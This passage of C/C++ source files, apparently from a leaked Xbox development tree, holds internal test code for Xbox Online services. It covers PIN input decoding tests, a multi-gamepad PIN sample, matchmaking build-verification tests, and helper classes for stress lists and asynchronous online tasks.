	xSetFunctionName(hLog, "");



	xSetFunctionName(hLog, "XOnlinePINDecodeInput");
	START_TESTCASE("Decode PIN input");

	inputState.dwPacketNumber = 10;
	inputState.Gamepad.bAnalogButtons[0] = 0;

	hPinHandle = XOnlinePINStartInput( &inputState );
	
	xLog(hLog, XLL_INFO, "XOnlinePINStartInput returned 0x%08x", hPinHandle);
	if(!hPinHandle)
	{
		FAIL_TESTCASE("Failed to start PIN input");
	}

	inputState.dwPacketNumber = 20;
	inputState.Gamepad.bAnalogButtons[0] = 200;
	hr = XOnlinePINDecodeInput( hPinHandle, &inputState, &pinByte );
	
	xLog(hLog, XLL_INFO, "XOnlinePINDecodeInput returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlinePINDecodeInput failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "Decoded byte 0x%02x", pinByte);

	hr = XOnlinePINEndInput(hPinHandle);
	hPinHandle = NULL;
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlinePINEndInput failed unexpectedly");
	}

	PASS_TESTCASE("PIN successfully decoded");

	END_TESTCASE();
	xSetFunctionName(hLog, "");


Exit:

	if(hPinHandle)
		XOnlinePINEndInput(hPinHandle);

	if(hLogon)
		XOnlineTaskClose(hLogon);

	if(hEvent)
		CloseHandle(hEvent);

	return;
}

//==================================================================================
// XAuthBVTEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI XAuthBVTEndTest()
{

}

} // namespace XAuthTestNamespace

// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XAuthBVT )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( XAuthBVT )
    EXPORT_TABLE_ENTRY( "StartTest", XAuthBVTStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XAuthBVTEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", XAuthBVTDllMain )
END_EXPORT_TABLE( XAuthBVT )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xauth\xauthpin\xauthpin.c ===
#include <xtl.h>
#include <xonline.h>
#include <stdio.h>

/* This sample program tests PIN decoding functions with multiple gamepads

/* This sample application links against libraries which were not part
   of the SDK as of the writing of this code. Namely XOnline APIs. Update
   project settings when these APIs will be released witin the SDK */

void __cdecl main()
{
	int i;
	HRESULT hr;
	XINPUT_STATE inputState;
	BYTE pinDigit;
	char debugString[256];

	//each gamepad has a handle plus a special handle for decoding pin
	HANDLE gamepad[4];
	XPININPUTHANDLE pinHandle[4];

	//these strings are used to identify enumerated button codes
	char buttonStrings[12][20] = { "up", "down", "left", "right", "A", "B", "X", "Y", "black", "silver", "LT", "RT"};
	
	//initialize gamepads
	XInitDevices( 0, NULL );
	Sleep(1000);	//this should be replaced with a check for device presence before XInputOpen, this is a lazy hack
	for(i=0; i<4; i++)
	{
		gamepad[i] = XInputOpen( XDEVICE_TYPE_GAMEPAD, XDEVICE_PORT0 + i, XDEVICE_NO_SLOT, NULL );
	}

	//start decoding for each gamepad
	for(i=0; i<4; i++ )
	{
		if( gamepad[i]!=0 )
		{
			XInputGetState( gamepad[i], &inputState );
			pinHandle[i] = XOnlinePINStartInput( &inputState );
		}
	}

	//decode button presses from all gamepad indefinately
	while( 1 )
	{
		for( i=0; i<4; i++)
		{
			if( gamepad[i]!= 0 )
			{
				XInputGetState( gamepad[i], &inputState);
				hr = XOnlinePINDecodeInput( pinHandle[i], &inputState, &pinDigit );
				if( hr == S_OK )
				{
					sprintf( debugString, "Gamepad #%d key is: ", i );
					OutputDebugString( debugString );
					OutputDebugString( &buttonStrings[pinDigit-1][0] );
					OutputDebugString( "\n" );
				} //if
			} //if
		} //for
	} //while

	//these calls are never executed but in a "normal" program should be used
	XOnlinePINEndInput( pinHandle );

	//close input devices
	for(i=0; i<4; i++)
	{
		if( gamepad[i] != 0 )
			XInputClose( gamepad[i] );;
	}
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\bvt\xmatchbvt.h ===
#ifndef __XMATCHBVT_H__
#define __XMATCHBVT_H__

//==================================================================================
// Includes
//==================================================================================
#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>
#include <xnetref.h>
#include "OnlineAccounts.h"

namespace XMatchBVTNamespace {

//==================================================================================
// Defines
//==================================================================================
#define ONFIX	1
#define SY_NEED_POPULATE_USERS	1

#define INT1 111222333444555666
#define STRING1 L"AAAAABBBBB"
#define BLOB1 "ZZZZZYYYYY"
#define INT2 0
#define STRING2 L"ccc"
#define BLOB2 "www"

#define GETSESSSP_INDEX 0x0000000A
#define GETSESSINT_INDEX 0x0000000B

#define GLOBALINT_ID1 X_ATTRIBUTE_DATATYPE_INTEGER | 0x00000002
#define GLOBALSTR_ID1 X_ATTRIBUTE_DATATYPE_STRING | 0x00000001
#define GLOBALBLB_ID1 X_ATTRIBUTE_DATATYPE_BLOB | 0x00000001
#define GLOBALINT_ID2 X_ATTRIBUTE_DATATYPE_INTEGER | 0x00000003
#define GLOBALSTR_ID2 X_ATTRIBUTE_DATATYPE_STRING | 0x00000004
#define GLOBALBLB_ID2 X_ATTRIBUTE_DATATYPE_BLOB | 0x00000004

#define PUMP_CS_EVENT()					{\
											DWORD dwCurrentTime = GetTickCount();\
											hrDoWork2 = XOnlineTaskContinue(hLogon); \
											if(FAILED(hrDoWork2)) \
											{ \
												xLog(hLog, XLL_FAIL, "Lost connection with CS, exiting test!"); \
												goto Exit; \
											}\
										}
#define FAIL_TESTCASE(FailureMessage)	xLog(hLog, XLL_FAIL, FailureMessage); \
										break
#define PASS_TESTCASE(PassMessage)		xLog(hLog, XLL_PASS, PassMessage);
#define START_TESTCASE(TestCaseName)	while(TRUE) \
										{ \
											xStartVariation(hLog, TestCaseName)
#define END_TESTCASE()						break; \
										}; \
										PUMP_CS_EVENT()\
										xEndVariation(hLog)
#define CLEANUP_TASK(hTask)				if(hTask) \
										{ \
											XOnlineTaskClose(hTask); \
											hTask = NULL; \
										}

__forceinline void DbgBreak()
{
    _asm int 3;
}

#define Verify(x)       do { if (!(x)) DbgBreak(); } while (0)

//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI XMatchBVTDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI XMatchBVTStartTest(IN HANDLE hLog);
VOID WINAPI XMatchBVTEndTest();

} // namespace XMatchBVTNamespace

#endif // __XMatchBVT_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\common\stressutils.cpp ===
//==================================================================================
// stressutils.cpp: implementation of various helper classes for stress tests
//==================================================================================
#include "stressutils.h"

//==================================================================================
// CXMStressList
//==================================================================================
template <class T>
CXMStressList<T>::CXMStressList()
{
	m_dwItemCount = 0;
	m_pFirstItem = NULL;
	m_pCurrentItem = NULL;
}

template <class T>
CXMStressList<T>::~CXMStressList()
{
	PXMSTRESS_ITEM pNext = NULL, pCurrent = m_pFirstItem;

	while(pCurrent)
	{
		pNext = pCurrent->pNext;
		delete pCurrent;
		pCurrent = pNext;
	}
}

template <class T>
T* CXMStressList<T>::GetFirstItem()
{
	if(m_pFirstItem)
	{
		m_pCurrentItem = m_pFirstItem->pNext;
		return (T*) m_pFirstItem->pItem;
	}

	return NULL;
}

template <class T>
T* CXMStressList<T>::GetNextItem()
{
	PXMSTRESS_ITEM pReturnItem = m_pCurrentItem;

	// If there is another item, then move the scanning pointer ahead so that
	// the next call to GetNextItem will work
	if(m_pCurrentItem)
	{
		m_pCurrentItem = m_pCurrentItem->pNext;
	}

	return pReturnItem;
}

// Add a new item to the head
template <class T>
BOOL CXMStressList<T>::AddItem( T* pItem )
{
	PXMSTRESS_ITEM pHead = m_pFirstItem;

	m_pFirstItem = new XMSTRESS_ITEM;

	// If we can't allocate a new item, then set the first item
	// back to its original value and return FALSE;
	if(!m_pFirstItem)
	{
		m_pFirstItem = pHead;
		return FALSE;
	}

	m_pFirstItem->pItem = pItem;
	m_pFirstItem->pNext = pHead;

	++m_dwItemCount;

	return TRUE;
}

// Remove a specific item from the list
template <class T>
BOOL CXMStressList<T>::RemoveItem( T* pItem )
{
	PXMSTRESS_ITEM pPrevious = NULL, pCurrent = m_pFirstItem;

	// Search the entire list for the same pointer
	while(pCurrent)
	{
		if(pCurrent->pItem == pItem)
		{
			// If someone is scanning through the list via GetNextItem, then we need
			// to make sure the scanning pointer doesn't point to something we're deleting
			if(m_pCurrentItem = pCurrent)
				m_pCurrentItem = pCurrent->pNext;

			// In this case, we are not removing the first item of the list
			if(pPrevious)
			{
				pPrevious->pNext = pCurrent->pNext;
			}
			// In this case, we are removing the first item of the list
			else
			{
				m_pFirstItem = pCurrent->pNext;
			}

			// Delete the item and exit
			delete pCurrent;
			--m_dwItemCount;

			return TRUE;
		}

		// Continue scanning items
		pPrevious = pCurrent;
		pCurrent = pCurrent->pNext;
	}

	return FALSE;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\common\asyncrequest.h ===
//==================================================================================
// xmclasses.h: header for XMatch request helper classes
//==================================================================================

#if !defined(ASYNCREQUEST_H)
#define ASYNCREQUEST_H

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <xtl.h>
#include <xdbg.h>
#include <xonline.h>

//==================================================================================
// Structures
//==================================================================================
typedef enum
{
	STATE_NOTSTARTED = 0,
	STATE_INPROGRESS,
	STATE_CANCELLED,
	STATE_COMPLETE
} XONLINE_ASYNC_STATE;

//==================================================================================
// CXOnlineAsyncRequest
//==================================================================================
class CXOnlineAsyncRequest
{
public:
	CXOnlineAsyncRequest();
	~CXOnlineAsyncRequest();
	HRESULT DoWork(DWORD dwTimeToWork);
	HRESULT Cancel();
	HRESULT Close();
	HANDLE GetWorkEvent() { return m_hWorkEvent; }
	XONLINETASK_HANDLE GetTaskHandle() { return m_hTaskHandle; }
	XONLINE_ASYNC_STATE GetCurrentState() { return m_nCurrentState; }
	INT GetRequestCategory() { return m_nRequestCategory; }
	void SetAsyncID(DWORD dwAsyncID) { m_dwAsyncID = dwAsyncID; }
	DWORD GetAsyncID() { return m_dwAsyncID; }
	void SetRequestCategory(INT nRequestCategory) { m_nRequestCategory = nRequestCategory; }
	virtual HRESULT StartRequest() = 0;

protected:
	INT m_nRequestCategory;
	HANDLE m_hWorkEvent;
	XONLINETASK_HANDLE m_hTaskHandle;
	XONLINE_ASYNC_STATE m_nCurrentState;
	DWORD m_dwAsyncID;
};

#endif // !defined(ASYNCREQUEST_H)
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\common\stressutils.h ===
//==================================================================================
// xmstress.h: header for stress utilities
//==================================================================================

#if !defined(STRESSUTILS_H)
#define STRESSUTILS_H

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <xtl.h>

typedef struct _XMSTRESS_ITEM
{
	LPVOID					pItem;
	struct _XMSTRESS_ITEM	*pNext;
} XMSTRESS_ITEM, *PXMSTRESS_ITEM;

//==================================================================================
// CXMStressList
//==================================================================================

template <class T> class CXMStressList 
{
public:
    CXMStressList();
    ~CXMStressList();
	T* GetFirstItem();
	T* GetNextItem();
	DWORD GetItemCount() { return m_dwItemCount; }
	BOOL AddItem(T* pItem);
	BOOL RemoveItem(T* pItem);
private:
	DWORD m_dwItemCount;
	PXMSTRESS_ITEM* m_pFirstItem;
	PXMSTRESS_ITEM* m_pCurrentItem;
};

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\common\asyncrequest.cpp ===
//==================================================================================
// asyncrequest.cpp: implementation of a class wrapper for online async requests
//==================================================================================
#include "asyncrequest.h"

inline DWORD AsyncRequestGetElapsedTime(DWORD dwStartTime, DWORD dwCurrentTime)
{
	dwCurrentTime = GetTickCount();
	if(dwStartTime > dwCurrentTime)
		return (MAXDWORD - dwStartTime + dwCurrentTime);
	else
		return (dwCurrentTime - dwStartTime);
}

//==================================================================================
// CXOnlineAsyncRequest
//==================================================================================
CXOnlineAsyncRequest::CXOnlineAsyncRequest()
{
	m_hWorkEvent = NULL;
	m_hTaskHandle = NULL;
	m_nCurrentState = STATE_NOTSTARTED;
	m_dwAsyncID = 0;
}

CXOnlineAsyncRequest::~CXOnlineAsyncRequest()
{
	DWORD dwWorkFlags = 0, dwCancelPumpsLeft = 0;

	switch(m_nCurrentState)
	{
	case STATE_NOTSTARTED:
		if(!m_hTaskHandle)
			break;
		// Intentional fall-through if we have allocated a task handle and need to cleanup
	case STATE_INPROGRESS:
		ASSERT(!FAILED(XOnlineTaskCancel(m_hTaskHandle, &dwWorkFlags)));
		m_nCurrentState = STATE_CANCELLED;
		if(XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwWorkFlags))
			break;
		// Intentional fall-through if we need to poll for cancel to complete
	case STATE_CANCELLED:
		dwCancelPumpsLeft = 10;
		do
		{
			ASSERT(!FAILED(XOnlineTaskContinue(m_hTaskHandle, 0, &dwWorkFlags)));
			--dwCancelPumpsLeft;
		}
		while(dwCancelPumpsLeft && !XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwWorkFlags));

		// If we couldn't cancel the task after 10 work pumps, then ASSERT
		ASSERT(XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwWorkFlags));
		break;
	default:
		break;
	}

	if(m_hWorkEvent)
	{
		CloseHandle(m_hWorkEvent);
	}
}

HRESULT CXOnlineAsyncRequest::DoWork(DWORD dwTimeToWork)
{
	HRESULT hr = S_OK;
	DWORD dwStartTime = 0, dwCurrentTime = 0, dwElapsedTime = 0, dwWorkFlags = 0;

	// Verify parameters
	if(!m_hTaskHandle || !m_hWorkEvent || m_nCurrentState == STATE_NOTSTARTED || m_nCurrentState == STATE_COMPLETE)
	{
		__asm int 3;
		return E_INVALIDARG;
	}

	dwStartTime = GetTickCount();
	do
	{
		// Get the new elapsed time.  If we've gone over, try one more pump
		// but set up the elapsed time to show that we won't wait
		dwElapsedTime = AsyncRequestGetElapsedTime(dwStartTime, GetTickCount());
		if(dwElapsedTime >= dwTimeToWork)
			dwElapsedTime = dwTimeToWork;

		// Call the work pump
		dwWorkFlags = 0;

		if(m_hTaskHandle == (VOID *) 0xDDDDDDDD)
		{
			__asm int 3;
		}

		hr = XOnlineTaskContinue(m_hTaskHandle, dwTimeToWork - dwElapsedTime, &dwWorkFlags);
		if(FAILED(hr))
			return hr;

		// If the task is complete then return success
		if(XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwWorkFlags))
		{
			m_nCurrentState = STATE_COMPLETE;
			return S_OK;
		}

		// Get the new elapsed time and exit if we've gone over
		dwElapsedTime = AsyncRequestGetElapsedTime(dwStartTime, GetTickCount());
		if(dwElapsedTime >= dwTimeToWork)
			break;

		// Wait for the work event and return an error if we run out of time waiting
		if(WaitForSingleObject(m_hWorkEvent, dwTimeToWork - dwElapsedTime) == WAIT_TIMEOUT)
			break;

	} while(dwElapsedTime < dwTimeToWork);

	return E_PENDING;
}

HRESULT CXOnlineAsyncRequest::Cancel()
{
	HRESULT hr = S_OK;
	DWORD dwWorkFlags = 0;

	// Verify parameters
	if((m_nCurrentState != STATE_INPROGRESS) && (m_nCurrentState != STATE_NOTSTARTED))
		return E_INVALIDARG;

	hr = XOnlineTaskCancel(m_hTaskHandle, &dwWorkFlags);
	if(FAILED(hr))
		return hr;
	
	// If the task is complete then return success
	if(XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwWorkFlags))
	{
		m_nCurrentState = STATE_COMPLETE;
		return S_OK;
	}

	m_nCurrentState = STATE_CANCELLED;
	return S_OK;
}

HRESULT CXOnlineAsyncRequest::Close()
{
	HRESULT hr = S_OK;

	// Verify parameters
	if((m_nCurrentState != STATE_COMPLETE) && (m_nCurrentState != STATE_NOTSTARTED))
		return E_INVALIDARG;

	hr = XOnlineTaskCloseHandle(m_hTaskHandle);
	if(FAILED(hr))
		return hr;

	// Clean-up all memver variables
	m_hTaskHandle = NULL;
	CloseHandle(m_hWorkEvent);
	m_hWorkEvent = NULL;
	m_nCurrentState = STATE_NOTSTARTED;

	return S_OK;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\bvt\xmatchbvt.cpp ===
//==================================================================================
// Includes
//==================================================================================
#define INITGUID
#include "xmatchbvt.h"

#define	TestingTime	300000
#define BUG11022READY 0

using namespace XMatchBVTNamespace;

namespace XMatchBVTNamespace {

//==================================================================================
// Globals
//==================================================================================
HANDLE g_hHeap = NULL;

//==================================================================================
// Helper functions
//==================================================================================

DWORD GetBufferLenForInt()
{
	return sizeof(DWORD) + sizeof(ULONGLONG);
}

DWORD GetBufferLenForString(LPWSTR szString)
{
	DWORD dwSize = sizeof(DWORD) + sizeof(WORD);
	dwSize += (wcslen(szString) + 1) * sizeof(WCHAR);
	return dwSize;
}

DWORD GetBufferLenForBlob(LPSTR szBlob)
{
	DWORD dwSize = sizeof(DWORD) + sizeof(WORD);
	dwSize += strlen(szBlob) * sizeof(CHAR);
	return dwSize;
}

DWORD GetBufferLenForUserInt()
{
	return (sizeof(ULONGLONG) + GetBufferLenForInt());
}

DWORD GetBufferLenForUserString(LPWSTR szString)
{
	return (sizeof(ULONGLONG) + GetBufferLenForString(szString));
}

DWORD GetBufferLenForUserBlob(LPSTR szBlob)
{
	return (sizeof(ULONGLONG) + GetBufferLenForBlob(szBlob));
}

//==================================================================================
// XOnlineLogonWrapper
//----------------------------------------------------------------------------------
//
// Description: XOnlineLogon wrapper code stolen from dev tests
//
// Arguments:
//	HANDLE				hLog			Handle to logging subsystem
//	DWORD*          	pServices		Pointer to services for which credentials are desired
//	DWORD				cServices		Number of services
//	DWORD				dwMaxWaitTime	Maximum number of seconds to allow for logon to complete
//
// Returns: Passes back async completion result
//==================================================================================
HRESULT XOnlineLogonWrapper(HANDLE hLog, HANDLE	hEvent, PXONLINETASK_HANDLE phLogon, 
									DWORD* pServices, DWORD cServices, DWORD dwMaxWaitTime)
{
	XONLINE_USER        *pUsersArray;
	HRESULT				hr = E_FAIL;
	DWORD				dwNumUsers = 0, dwStartTime = 0, dwCurrentTime = 0, dwElapsedTime = 0;
	HRESULT 			hrDoWork2;
	TCHAR 				szMsg[128];

	// Get local users (we assume that the hard-drive has been populated)
    pUsersArray =  (XONLINE_USER *) LocalAlloc(LPTR,XONLINE_MAX_STORED_ONLINE_USERS * sizeof(XONLINE_USER));

    if(pUsersArray)        
	    hr = XOnlineGetUsers( pUsersArray, &dwNumUsers );
    else
    {
        xLog(hLog, XLL_INFO, "Memory Allocation Fail");
        hr = E_FAIL;
        goto Exit;
    }

	if (FAILED(hr))
	{
		xLog(hLog, XLL_INFO, "Getting users from hard-drive failed with 0x%08x", hr);
		hr = E_FAIL;
		goto Exit;
	}

	if(!dwNumUsers)
	{
		OutputDebugString(TEXT("No users were found on the hard-drive, run the SetupOnline tool!"));
		xLog(hLog, XLL_INFO, "No users were found on the hard-drive, run the SetupOnline tool!");
		hr = E_FAIL;
		goto Exit;
	}

	// Initialize services
	xLog(hLog, XLL_INFO, "Logging into %u services with %u users", cServices, dwNumUsers);
	hr = XOnlineLogon(pUsersArray, pServices, cServices, hEvent, phLogon);

       LocalFree(pUsersArray);

	if (FAILED(hr))
        goto Exit;

	dwElapsedTime = 0;
	dwStartTime = GetTickCount();

	// Pump until logon succeeds (PARTIAL_RESULTS flag set) or fails (DONT_CONTINUE flag set)
	xLog(hLog, XLL_INFO, "Waiting for logon to complete");
	do
	{
		if( WaitForSingleObject( hEvent, dwMaxWaitTime) != WAIT_OBJECT_0 )
		{
			xLog(hLog, XLL_INFO, "Waiting for logon event failed!");
			hr = E_FAIL;
			goto Exit;
		}

		dwCurrentTime = GetTickCount();

		hrDoWork2 = XOnlineTaskContinue(*phLogon);

	} while( XONLINETASK_S_RUNNING == hrDoWork2);		//same as while ( !XONLINETASK_STATUS_AVAILABLE(hrDoWork2) );while( XONLINETASK_S_RUNNING == hrDoWorks)

	wsprintf(szMsg, TEXT("XMatchBVTNamespace__XOnlineLogonWrapper: XOnlineTaskContinue returned %0x at last\n"),hrDoWork2);
	OutputDebugString(szMsg);

	hr = XOnlineLogonTaskGetResults(*phLogon);
	xLog(hLog, XLL_INFO, "Logon returned 0x%08x", hr);

	if (hr != XONLINE_S_LOGON_CONNECTION_ESTABLISHED)
	{
		xLog(hLog, XLL_INFO, "Logon failed asynchronously");
		hr = E_FAIL;
		goto Exit;
	}

	xLog(hLog, XLL_INFO, "Logon completed successfully");

Exit:

	return(hr);
}			


//==================================================================================
// PollTaskUntilComplete
//----------------------------------------------------------------------------------
//
// Description: Calls the XOnlineTaskComplete function until either the given
//    task has been completed or the amount of available time has expired
//
// Arguments:
//	XONLINETASK_HANDLE	hAsyncHandle		Handle to async task
//	HANDLE				hWorkToDoEvent		Event that is associated with this async task.
//											This can be set to NULL or INVALID_HANDLE_VALUE
//											if no event is associated with the task
//	DWORD				dwMaxWaitTime		Maximum amount of time to wait for the task to
//											complete. This can be set to INFINITE to block
//											until completion
//	DWORD				*pdwPollCounter		Optional counter passed in to keep track of the
//											number of calls made to the XOnlineTaskDoWork function
//	BOOL				*pfCompleted		Optional boolean passed in to keep track if whether
//											the task completed or not
//  BOOL				fCloseOnComplete	Indicates whether the function should close a handle
//											after it indicates completion
//
// Returns: The last result code from XOnlineTaskDoWork is returned.  If a valid pointer
//   is provided for pfCompleted, it is updated to reflect whether the task has completed or not
//==================================================================================
HRESULT PollTaskUntilComplete(XONLINETASK_HANDLE hAsyncHandle, HANDLE hWorkToDoEvent, DWORD dwMaxWaitTime, 
									DWORD *pdwPollCounter, BOOL *pfCompleted, BOOL fCloseOnComplete)
{
	HRESULT hr = S_OK;
	DWORD dwLastTime = 0, dwCurrentTime = 0, dwCurrentDuration = 0, dwWaitTimeLeft = dwMaxWaitTime;
	DWORD dwInternalPollCounter = 0;
	HRESULT 			hrDoWork2;

	if(pfCompleted)
		*pfCompleted = FALSE;

	dwLastTime = GetTickCount();

	do
	{

		if((hWorkToDoEvent != INVALID_HANDLE_VALUE) && (hWorkToDoEvent != NULL))
			WaitForSingleObject(hWorkToDoEvent, dwWaitTimeLeft);

		hrDoWork2 = XOnlineTaskContinue(hAsyncHandle);

		// Update the poll-counter
		++dwInternalPollCounter;

		if (XONLINETASK_S_RUNNING != hrDoWork2) // same as if (XONLINETASK_STATUS_AVAILABLE(hrDoWork2))
		{
			if (XONLINETASK_S_SUCCESS == hrDoWork2)	// same as if (XONLINETASK_STATUS_SUCCESSFUL_COMPLETION(hrDoWork2))
			{
				if(pfCompleted)
					*pfCompleted = TRUE;
			}
			else if(FAILED(hrDoWork2))
			{
			    	hr = hrDoWork2;
			}

			if(fCloseOnComplete)
				XOnlineTaskClose(hAsyncHandle);

			break;
	        }
		
		if(dwMaxWaitTime != INFINITE)
		{
			// See if we have gone beyond the maximum allowed time
			dwCurrentTime = GetTickCount();
			if(dwCurrentTime < dwLastTime)
			{
				dwCurrentDuration = ((MAXDWORD - dwLastTime) + dwCurrentTime);
			}
			else
			{
				dwCurrentDuration = (dwCurrentTime - dwLastTime);
			}
			
			if(dwCurrentDuration >= dwWaitTimeLeft)
			{
				DbgPrint("Async opration didn't complete within %u ms\n", dwMaxWaitTime);
				hr = E_FAIL;
				goto Exit;
			}
			
			dwWaitTimeLeft -= dwCurrentDuration;
			dwLastTime = dwCurrentTime;
		}
	} while(TRUE);

Exit:
	if(pdwPollCounter)
		*pdwPollCounter = dwInternalPollCounter;

	return hr;
}

//==================================================================================
// XMatchBVTDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI XMatchBVTDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	WSADATA WSAData;
	XNADDR xnaddr;
	DWORD dwElapsedTime = 0, dwStartTime = 0, dwCurrentTime = 0, dwResult = 0;

	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		
		dwElapsedTime = 0;
		dwStartTime = GetTickCount();
		
		// Wait until stack initialization completes
		do
		{
			dwCurrentTime = GetTickCount();
			
			// Calculate the elapsed time based on whether the time has wrapped around
			if(dwCurrentTime < dwStartTime)
				dwElapsedTime =  MAXDWORD - dwStartTime + dwCurrentTime;
			else
				dwElapsedTime = dwCurrentTime - dwStartTime;
			
			if(dwElapsedTime > 10000)
			{
				OutputDebugString(TEXT("Net stack failed to initialize"));
				return FALSE;
			}
			
			dwResult = XNetGetTitleXnAddr (&xnaddr);		
			
		} while (XNET_GET_XNADDR_PENDING == dwResult);

		WSAStartup(MAKEWORD(2, 2), &WSAData);
		g_hHeap = HeapCreate(0,0,0);
		break;
	case DLL_PROCESS_DETACH:
		WSACleanup();
		XNetRelease();
		HeapDestroy(g_hHeap);
		g_hHeap = NULL;
		break;
	default:
		break;
	}

    return TRUE;
}


//==================================================================================
// XMatchBVTStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI XMatchBVTStartTest(IN HANDLE  hLog)
{
	PXMATCH_SEARCHRESULT *ppSearchResult = NULL;
	XONLINETASK_HANDLE hLogon = NULL, hSessionTask = NULL, hUpdateTask = NULL, hSearchTask = NULL, hDeleteTask = NULL;
	DWORD ServicesArray[] =
	{
		XONLINE_MATCHMAKING_SERVICE
	};
//	XONLINE_USER UsersArray[XONLINE_MAX_STORED_ONLINE_USERS];
	ULONGLONG qwAttributeValue = 0;
	XNKID SessionID, newSessionID;
    XNKEY KeyExchangeKey;
	HRESULT hr = S_OK;
	HANDLE hLogonEvent, hSessionEvent = NULL, hUpdateEvent, hSearchEvent = NULL, hDeleteEvent = NULL;
	DWORD dwServices = 0, dwNumUsers = 0, dwNumResults = 0, dwAttributeType = 0, dwAttributeLen = 0, dwLogonFlags = 0;
	BOOL fDone = FALSE;
	HRESULT hrDoWork2;
	XONLINE_ATTRIBUTE	xOnAttr[6];

	hr = XOnlineStartup(NULL);
	Verify(hr == S_OK);	

#if BUG11022READY
	__try{
		XONLINETASK_HANDLE hTaskGarbage;
		XOnlineTaskClose(hTaskGarbage);
	}
	__except(EXCEPTION_EXECUTE_HANDLER){
		DWORD dwEx = GetExceptionCode();
	}
#endif

	xSetOwnerAlias(hLog, "tristanj");
	xSetComponent(hLog, "Online", "Matching - Client (O)");

	hLogonEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hSessionEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hUpdateEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hSearchEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hDeleteEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hLogonEvent || !hSessionEvent || !hUpdateEvent || !hSearchEvent || !hDeleteEvent)
	{
		xLog(hLog, XLL_FAIL, "Couldn't create events for matchmaking BVT");
		goto Exit;
	}

#if SY_NEED_POPULATE_USERS	
	hr = COnlineAccounts::Instance()->PopulateUserAccountsHD(NULL, XONLINE_MAX_LOGON_USERS);
	if(hr != S_OK)
	{
		xLog(hLog, XLL_FAIL, "Populating user accounts failed.");
		goto Exit;
	}
#endif

	// Handle logging on to necessary services
	dwServices = (sizeof(ServicesArray)/sizeof(DWORD));
//	hr = XOnlineLogonWrapper(hLog, &hLogon, NULL, 0, 30000);
	hr = XOnlineLogonWrapper(hLog, hLogonEvent, &hLogon, ServicesArray, dwServices, TestingTime);
	if(hr != XONLINE_S_LOGON_CONNECTION_ESTABLISHED)
	{
		xLog(hLog, XLL_FAIL, "Failed logon.");
		goto Exit;
	}

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSessionCreate");
	xStartVariation(hLog, "Advertise a session on the matchmaking server");
//==================================================================================
	while(TRUE)
	{
		memset(&SessionID, 0, sizeof(SessionID));

		xOnAttr[0].dwAttributeID = GLOBALINT_ID1;
		xOnAttr[0].info.integer.qwValue = INT1;
		xOnAttr[1].dwAttributeID = GLOBALSTR_ID1;
		xOnAttr[1].info.string.pwszValue = STRING1;
		xOnAttr[2].dwAttributeID = GLOBALBLB_ID1;
		xOnAttr[2].info.blob.pvValue = BLOB1;
		xOnAttr[2].info.blob.dwLength = strlen(BLOB1);
#if 0
		xOnAttr[3].dwAttributeID = GLOBALINT_ID2;
		xOnAttr[3].info.integer.qwValue = INT2;
		xOnAttr[4].dwAttributeID = GLOBALSTR_ID2;
		xOnAttr[4].info.string.pwszValue = STRING2;
		xOnAttr[5].dwAttributeID = GLOBALBLB_ID2;
		xOnAttr[5].info.blob.pvValue = BLOB2;
		xOnAttr[5].info.blob.dwLength = strlen(BLOB2);
#endif
		
		hr = XOnlineMatchSessionCreate(0,10,0,10,3, xOnAttr, hSessionEvent, &hSessionTask );

		xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
		if(FAILED(hr))
